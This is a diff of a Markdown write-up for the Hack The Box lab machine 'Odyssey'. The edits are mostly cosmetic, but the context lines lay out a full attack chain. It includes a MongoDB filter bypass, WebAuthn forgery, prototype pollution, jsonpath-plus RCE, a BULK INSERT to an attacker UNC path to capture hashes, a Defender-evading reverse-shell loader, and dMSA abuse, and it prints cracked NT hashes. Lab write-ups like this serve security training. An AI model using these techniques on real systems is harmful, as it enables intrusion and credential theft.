@@ -6,7 +6,11 @@ coverY: 0
 
 # HTB-ODYSSEY
 
-### Recon
+
+
+<figure><img src="../../../../.gitbook/assets/image (262).png" alt=""><figcaption></figcaption></figure>
+
+### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>
 
 #### Port Scan
 
@@ -66,13 +70,13 @@ Nothing extra. The whole thing lives under `aegis.korvia.htb`. Fine.
 /onboard    (Status: 400)
 ```
 
-Everything redirects to `/login` except `/onboard` which throws a 400. That's interesting — the app is definitely running, it just rejected our request. Keep that in mind.
+Everything redirects to `/login` except `/onboard` which throws a 400. That's interesting the app is definitely running, it just rejected our request. Keep that in mind.
 
 ***
 
-### Web App — Initial Enumeration
+### Web App -  Initial Enumeration
 
-Visiting `http://aegis.korvia.htb:3000/` drops us at `/login`. The UI is slick — it's called **AEGIS**, "Sovereign Signing & Attestation Authority, Directorate 9". Very government-y. And it only accepts **hardware authenticator** login — FIDO2/WebAuthn. No username/password field anywhere.
+Visiting `http://aegis.korvia.htb:3000/` drops us at `/login`. The UI is slick it's called **AEGIS**, "Sovereign Signing & Attestation Authority, Directorate 9". Very government-y. And it only accepts **hardware authenticator** login  FIDO2/WebAuthn. No username/password field anywhere.
 
 Firing a dummy login attempt through Burp to see what the auth flow actually looks like:
 
@@ -103,7 +107,7 @@ So we've got an API at `/api/v1`, backend is WebAuthn. Now hitting `/onboard` to
 No matching record in pending_invites (token may have been redeemed, expired, or never issued).
 ```
 
-The error message just leaked the collection name — `pending_invites`. This is MongoDB almost certainly, and there's a collection of invite tokens sitting somewhere in the database. That's our first real lead. If we can read from `pending_invites`, we can onboard ourselves.
+The error message just leaked the collection name `pending_invites`. This is MongoDB almost certainly, and there's a collection of invite tokens sitting somewhere in the database. That's our first real lead. If we can read from `pending_invites`, we can onboard ourselves.
 
 ***
 
@@ -160,7 +164,7 @@ Pipeline works. Now the goal is reading from `pending_invites`. Direct `$lookup`
 }
 ```
 
-`$facet` is allowed — it just complained about the format, not about the stage itself. The key thing about `$facet` is it supports **sub-pipelines**, and `$lookup` is valid inside a sub-pipeline even when it's blocked at the top level. This is the bypass. We're nesting a blocked operator inside an allowed one.
+`$facet` is allowed it just complained about the format, not about the stage itself. The key thing about `$facet` is it supports **sub-pipelines**, and `$lookup` is valid inside a sub-pipeline even when it's blocked at the top level. This is the bypass. We're nesting a blocked operator inside an allowed one.
 
 The full payload to dump `pending_invites`:
 
@@ -191,15 +195,15 @@ The full payload to dump `pending_invites`:
 ]
 ```
 
-Got a pile of unredeemed operator tokens. `$lookup` is blocked at the aggregation root, but inside `$facet`'s sub-pipeline it runs fine. The protection is shallow — it only checks top-level stages.
+Got a pile of unredeemed operator tokens. `$lookup` is blocked at the aggregation root, but inside `$facet`'s sub-pipeline it runs fine. The protection is shallow it only checks top-level stages.
 
 ***
 
 ### WebAuthn Authenticator Forgery
 
-With a token, we can hit `/onboard/<token>` and start the registration flow. The problem: the app says "attestation ceremony will bind your hardware authenticator to operator op-2026-0042" — and then fails with "not allowed outside localhost".
+With a token, we can hit `/onboard/<token>` and start the registration flow. The problem: the app says "attestation ceremony will bind your hardware authenticator to operator op-2026-0042" and then fails with "not allowed outside localhost".
 
-But look at the registration options response — `"attestation": "none"`. When attestation is `none`, the server never actually verifies the authenticator hardware. It can't. It just accepts whatever the client sends back as long as the signature checks out. The "localhost only" restriction is enforced by the **browser**, not the server. The `/api/v1/auth/webauthn/register/finish` endpoint is still reachable directly.
+But look at the registration options response  `"attestation": "none"`. When attestation is `none`, the server never actually verifies the authenticator hardware. It can't. It just accepts whatever the client sends back as long as the signature checks out. The "localhost only" restriction is enforced by the **browser**, not the server. The `/api/v1/auth/webauthn/register/finish` endpoint is still reachable directly.
 
 So we're writing our own authenticator client. Here's the full registration script:
 
@@ -282,7 +286,7 @@ print("[+] credential saved")
 [+] credential saved
 ```
 
-Now we need a login script. The registration response showed us `user.id` is just base64 of the operator handle — `b3AtMjAyNi0wMDQy` decodes to `op-2026-0042`. If the server looks up permissions using the `userHandle` from the authentication response **without cross-validating it against the registered credential**, we can just send `admin` as the userHandle. That's the confusion — it trusts what the client sends instead of checking what was registered.
+Now we need a login script. The registration response showed us `user.id` is just base64 of the operator handle  `b3AtMjAyNi0wMDQy` decodes to `op-2026-0042`. If the server looks up permissions using the `userHandle` from the authentication response **without cross-validating it against the registered credential**, we can just send `admin` as the userHandle. That's the confusion  it trusts what the client sends instead of checking what was registered.
 
 ```python
 # webauthn_login.py
@@ -349,13 +353,13 @@ print(f"[+] cookie: aegis.sid={s.cookies.get('aegis.sid')}")
 [+] cookie: aegis.sid=s%3A...
 ```
 
-Administrator. The server validates the cryptographic signature (which passes, because we signed with the key we registered), but it then reads the **role** from the `userHandle` field we sent — not from the credential record. Two separate things. The protection only checked one of them.
+Administrator. The server validates the cryptographic signature (which passes, because we signed with the key we registered), but it then reads the **role** from the `userHandle` field we sent  not from the credential record. Two separate things. The protection only checked one of them.
 
 ***
 
 ### Prototype Pollution → Raw LaTeX Blocks
 
-As admin we get a few extra panels. The interesting one is **Notice Templates** — it's a template drafting system with a live render preview.
+As admin we get a few extra panels. The interesting one is **Notice Templates** it's a template drafting system with a live render preview.
 
 The template body uses Nunjucks syntax. There's a `{{ overrides | merge(defaults) | json }}` call in the template. The `overrides` value comes from the JSON blob we supply in the preview panel's "OVERRIDES (JSON)" field. A `merge` filter doing recursive property assignment on user input is a classic prototype pollution sink.
 
@@ -365,7 +369,7 @@ Looking at the pandoc invocation in the render log:
 "cmd": "/usr/bin/pandoc --from markdown-raw_attribute --to latex ..."
 ```
 
-The `-raw_attribute` suffix **disables** raw LaTeX blocks in markdown. There's also an `allowRawBlocks: false` field in the default overrides. If we pollute `Object.prototype.allowRawBlocks = true`, the flag switches to `+raw_attribute` — and then we can embed literal LaTeX in the markdown using the `` `\latex code`{=latex} `` syntax.
+The `-raw_attribute` suffix **disables** raw LaTeX blocks in markdown. There's also an `allowRawBlocks: false` field in the default overrides. If we pollute `Object.prototype.allowRawBlocks = true`, the flag switches to `+raw_attribute` and then we can embed literal LaTeX in the markdown using the `` `\latex code`{=latex} `` syntax.
 
 **Pollution payload in the overrides box:**
 
@@ -383,7 +387,7 @@ After saving the draft and rendering:
 "cmd": "/usr/bin/pandoc --from markdown+raw_attribute --to latex ..."
 ```
 
-The `+` confirms pollution worked. `allowRawBlocks` was never an own property of the overrides object — it was inherited from `Object.prototype` being polluted. The merge filter set it there and the pandoc command builder picked it up.
+The `+` confirms pollution worked. `allowRawBlocks` was never an own property of the overrides object it was inherited from `Object.prototype` being polluted. The merge filter set it there and the pandoc command builder picked it up.
 
 ***
 
@@ -391,9 +395,9 @@ The `+` confirms pollution worked. `allowRawBlocks` was never an own property of
 
 Now we have raw LaTeX execution inside a pipeline that goes `nunjucks → pandoc → pdflatex/latex → ghostscript`. Shell escape is disabled on every step (`-no-shell-escape`, `-dSAFER`). Direct RCE is a dead end.
 
-But TeX has file I/O at the typesetting layer. `\input{/etc/passwd}` works — we get the file contents mangled through the typesetter. Slashes turn into equals signs, long lines break, font prefix noise everywhere. Not clean enough for reading paths with special characters.
+But TeX has file I/O at the typesetting layer. `\input{/etc/passwd}` works  we get the file contents mangled through the typesetter. Slashes turn into equals signs, long lines break, font prefix noise everywhere. Not clean enough for reading paths with special characters.
 
-The clean approach uses TeX's raw I/O primitives — `\openin`, `\read`, `\message` — which operate **below** the typesetting engine. `\read` stores a line into a macro without processing its characters. `\message` dumps text to the log stream. The log is what comes back in the render response.
+The clean approach uses TeX's raw I/O primitives `\openin`, `\read`, `\message` which operate **below** the typesetting engine. `\read` stores a line into a macro without processing its characters. `\message` dumps text to the log stream. The log is what comes back in the render response.
 
 Payload embedded in the template body:
 
@@ -450,7 +454,7 @@ async (req, res) => {
     matches = JSONPath(opts);
 ```
 
-`preventEval: false` with `jsonpath-plus` — that's CVE-2025-1302. Read the token:
+`preventEval: false` with `jsonpath-plus`  that's CVE-2025-1302. Read the token:
 
 ```
 ┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
@@ -471,7 +475,7 @@ Vulnerable.
 
 ***
 
-### CVE-2025-1302 — jsonpath-plus RCE → webadmin
+### CVE-2025-1302 jsonpath-plus RCE → webadmin
 
 CVE-2025-1302 abuses `jsonpath-plus`'s eval path. When `preventEval` is false (the default before the fix), the `?()` filter expression is passed to `eval()` or the `Function` constructor. You can smuggle any JS code in there. The `eval: 'safe'` option doesn't fully protect it because `preventEval: false` takes precedence in this version's code path.
 
@@ -512,7 +516,7 @@ webadmin@odyssey-web:~/aegis$ id
 uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),4(adm),27(sudo),983(aegis-render)
 ```
 
-We're `webadmin` on the Linux box. The `sudo` group membership immediately stands out — that's worth checking.
+We're `webadmin` on the Linux box. The `sudo` group membership immediately stands out that's worth checking.
 
 ***
 
@@ -592,7 +596,7 @@ is_bulkadmin
 1
 ```
 
-Not sysadmin, but `bulkadmin`. `BULK INSERT` can take a UNC path as the data source — that's a coercion path. The MSSQL service will try to authenticate to whatever UNC path we give it. We can't relay on Server 2025 (NTLM relay is dead there), but we can capture and crack the hash.
+Not sysadmin, but `bulkadmin`. `BULK INSERT` can take a UNC path as the data source that's a coercion path. The MSSQL service will try to authenticate to whatever UNC path we give it. We can't relay on Server 2025 (NTLM relay is dead there), but we can capture and crack the hash.
 
 Start Responder, set up a ligolo listener to forward port 445:
 
@@ -618,7 +622,7 @@ SQL> EXEC ('BULK INSERT aegis_audit.dbo.audit_ingest_staging FROM ''\\172.16.0.1
 └─$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-Mode 5600 is NetNTLMv2. The hash includes a timestamp and random nonces, so it can't be passed — but rockyou gets it.
+Mode 5600 is NetNTLMv2. The hash includes a timestamp and random nonces, so it can't be passed but rockyou gets it.
 
 ```
 svc-mssql::ODYSSEY:...:cml958782
@@ -648,7 +652,7 @@ SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
 
 `SeImpersonatePrivilege` means GodPotato will work. The issue is Defender is active and deletes any normal binary we drop. We need evasion.
 
-#### AV Evasion Chain — Go Reverse Shell + Donut + XOR Loader
+#### AV Evasion Chain Go Reverse Shell + Donut + XOR Loader
 
 The strategy: compile a Go reverse shell (native PE, no .NET/AMSI hooks), run it through `donut` to get position-independent shellcode with GodPotato embedded, XOR-encrypt the shellcode with a random key to destroy any static signatures, wrap everything in a Go loader that does RW → RX page flip (never RWX, which trips heuristics).
 
@@ -810,15 +814,15 @@ Four hops of group membership inheritance, but the end result is our machine acc
 [*] NT hash for 'svc-aegis-build': bbc270509ec878cf516d5295fb4d774d
 ```
 
-`svc-aegis-build` is now ours. `bloodyAD` shows it has `CreateChild` and `WriteProperty` on `OU=Migrations`. That OU contains `svc-aegis-deploy`, and the attributes in play are `msDS-SupersededManagedAccountLink` and `msDS-SupersededServiceAccountState` — the exact attributes needed for a dMSA BadSuccessor-style attack.
+`svc-aegis-build` is now ours. `bloodyAD` shows it has `CreateChild` and `WriteProperty` on `OU=Migrations`. That OU contains `svc-aegis-deploy`, and the attributes in play are `msDS-SupersededManagedAccountLink` and `msDS-SupersededServiceAccountState` the exact attributes needed for a dMSA BadSuccessor-style attack.
 
 ***
 
 ### dMSA Ouroboros → svc-aegis-deploy
 
-The classic BadSuccessor (CVE-2025-53779) is patched on Server 2025. The patch validates that the bidirectional migration link exists — both the superseded account points to the dMSA **and** the dMSA points back. What the patch doesn't check is **who wrote those links**. If an attacker can write both sides, they satisfy the validation and the KDC still issues credentials.
+The classic BadSuccessor (CVE-2025-53779) is patched on Server 2025. The patch validates that the bidirectional migration link exists both the superseded account points to the dMSA **and** the dMSA points back. What the patch doesn't check is **who wrote those links**. If an attacker can write both sides, they satisfy the validation and the KDC still issues credentials.
 
-The Ouroboros twist: enroll the dMSA in its own `msDS-GroupMSAMembership`. This makes the dMSA authorize its own credential retrieval — a self-sustaining loop that bypasses the need for a separate membership grant.
+The Ouroboros twist: enroll the dMSA in its own `msDS-GroupMSAMembership`. This makes the dMSA authorize its own credential retrieval a self-sustaining loop that bypasses the need for a separate membership grant.
 
 ```
 ┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
@@ -868,7 +872,7 @@ Now we need to grab SIDs to build the self-authorizing security descriptor:
 # S-1-5-21-4175332977-3571604968-1809176562-6101
 ```
 
-Build the SD — the dMSA's own SID plus our attacker SID both get full rights:
+Build the SD the dMSA's own SID plus our attacker SID both get full rights:
 
 ```python
 # create_SD.py
@@ -922,7 +926,7 @@ dMSA previous keys (including preceding managed accounts):
 RC4: 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa
 ```
 
-The "previous keys" RC4 is `svc-aegis-deploy`'s actual NT hash — the one that was superseded by the dMSA.
+The "previous keys" RC4 is `svc-aegis-deploy`'s actual NT hash the one that was superseded by the dMSA.
 
 ```
 ┌──(sn0x㉿sn0x)-[~/HTB/Odyssey]
@@ -933,7 +937,7 @@ We're on DC01.
 
 ***
 
-### .NET Pipe Analysis — AegisStreamSvc
+### .NET Pipe Analysis AegisStreamSvc
 
 Registry hunting on DC01 (can't run service queries, so we go through the registry):
 
@@ -978,9 +982,9 @@ CONFIG_IMPORT                → Operator
 MAINT_RELOAD                 → Operator
 ```
 
-We're in `AegisStream-Viewers` (because `svc-aegis-deploy` is a member of that group), so we can connect to the pipe and call Viewer-level opcodes. We can also read `viewer.key` and `auditor.key` directly from disk — they're cleartext.
+We're in `AegisStream-Viewers` (because `svc-aegis-deploy` is a member of that group), so we can connect to the pipe and call Viewer-level opcodes. We can also read `viewer.key` and `auditor.key` directly from disk they're cleartext.
 
-The `operator.key` is protected: it's AES-GCM encrypted (`operator.key.enc`), with the key-encryption-key itself DPAPI-wrapped under the service account (`operator.wrap.bin`). However — and this is the critical flaw — `BootstrapOperatorEncryption` **never deletes the cleartext `operator.key`**. It reads it, encrypts it, and just... leaves it there. Except we can't read `operator.key` directly because the ACL restricts it to `svc-aegis-stream`.
+The `operator.key` is protected: it's AES-GCM encrypted (`operator.key.enc`), with the key-encryption-key itself DPAPI-wrapped under the service account (`operator.wrap.bin`). However and this is the critical flaw`BootstrapOperatorEncryption` **never deletes the cleartext `operator.key`**. It reads it, encrypts it, and just... leaves it there. Except we can't read `operator.key` directly because the ACL restricts it to `svc-aegis-stream`.
 
 ***
 
@@ -1081,11 +1085,11 @@ object config = deserializer.Deserialize<object>(new StringReader(yaml));
 _config.Apply(config);
 ```
 
-`TypeNameInTagNodeTypeResolver` is marked `[Obsolete]` by YamlDotNet's own authors. What it does: strip the leading `!` from a YAML tag, pass the rest to `Type.GetType()`. If the type resolves, it becomes the deserialization target. The target type here is `object` — no constraint at all.
+`TypeNameInTagNodeTypeResolver` is marked `[Obsolete]` by YamlDotNet's own authors. What it does: strip the leading `!` from a YAML tag, pass the rest to `Type.GetType()`. If the type resolves, it becomes the deserialization target. The target type here is `object`  no constraint at all.
 
-`AegisStreamSvc.runtimeconfig.json` includes `Microsoft.WindowsDesktop.App` framework, which loads `PresentationFramework.dll` — the WPF assembly. That assembly contains `System.Windows.Data.ObjectDataProvider`, a well-known .NET deserialization gadget that auto-invokes `MethodName` on `ObjectInstance` during property assignment.
+`AegisStreamSvc.runtimeconfig.json` includes `Microsoft.WindowsDesktop.App` framework, which loads `PresentationFramework.dll`  the WPF assembly. That assembly contains `System.Windows.Data.ObjectDataProvider`, a well-known .NET deserialization gadget that auto-invokes `MethodName` on `ObjectInstance` during property assignment.
 
-The only snag: assembly-qualified names contain commas, and commas are problematic in YAML tags. The fix: YamlDotNet's scanner decodes percent-encoding in tag URIs. `%2C` → `,`. The scanner consumes `%`, `2`, `C` as three characters and emits one comma character — which then gets passed cleanly to `Type.GetType()`.
+The only snag: assembly-qualified names contain commas, and commas are problematic in YAML tags. The fix: YamlDotNet's scanner decodes percent-encoding in tag URIs. `%2C` → `,`. The scanner consumes `%`, `2`, `C` as three characters and emits one comma character which then gets passed cleanly to `Type.GetType()`.
 
 **The payload:**
 
@@ -1298,7 +1302,7 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:890b9e96245f6895e06adfe92ad1e
 
 ***
 
-### Techniques Reference
+### Techniques I used
 
 | Technique                                                           | Where Used                                                   |
 | ------------------------------------------------------------------- | ------------------------------------------------------------ |
